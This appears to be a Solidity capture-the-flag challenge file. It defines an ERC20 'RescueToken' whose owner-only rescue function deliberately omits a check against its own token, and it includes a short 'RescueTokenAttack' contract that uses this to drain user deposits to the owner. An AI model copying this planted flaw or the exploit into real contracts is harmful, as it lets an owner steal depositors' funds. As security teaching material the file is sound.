// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title RescueToken (Secureum CTF - Optional)
 * @notice A token contract with a rescue function that allows the owner to
 *         recover tokens accidentally sent to the contract.
 *         Vulnerability: The rescue function can be exploited if the contract
 *         holds its own tokens as part of its mechanism.
 */
contract RescueToken is ERC20 {
    using SafeERC20 for IERC20;

    address public owner;
    mapping(address => uint256) public deposits;

    event TokensRescued(address indexed token, address indexed to, uint256 amount);
    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    constructor(uint256 initialSupply) ERC20("Rescue Token", "RSC") {
        owner = msg.sender;
        _mint(msg.sender, initialSupply);
    }

    /**
     * @notice Deposit tokens into the contract.
     */
    function deposit(uint256 amount) external {
        _transfer(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
        emit Deposited(msg.sender, amount);
    }

    /**
     * @notice Withdraw deposited tokens.
     */
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient deposit");
        deposits[msg.sender] -= amount;
        _transfer(address(this), msg.sender, amount);
        emit Withdrawn(msg.sender, amount);
    }

    /**
     * @notice Rescue tokens accidentally sent to this contract.
     *         Vulnerability: Does not exclude the contract's own token,
     *         allowing owner to steal deposited tokens.
     */
    function rescueTokens(address token, address to, uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        // BUG: Should check that token != address(this) to protect deposits
        IERC20(token).safeTransfer(to, amount);
        emit TokensRescued(token, to, amount);
    }
}

/**
 * @title RescueTokenAttack
 * @notice Exploit: If the attacker is the owner, they can call rescueTokens
 *         with the contract's own address to steal all deposited tokens.
 */
contract RescueTokenAttack {
    RescueToken public target;
    address public owner;

    constructor(address _target) {
        target = RescueToken(_target);
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        // As owner, rescue the contract's own tokens (stealing deposits)
        target.rescueTokens(address(target), owner, amount);
    }
}
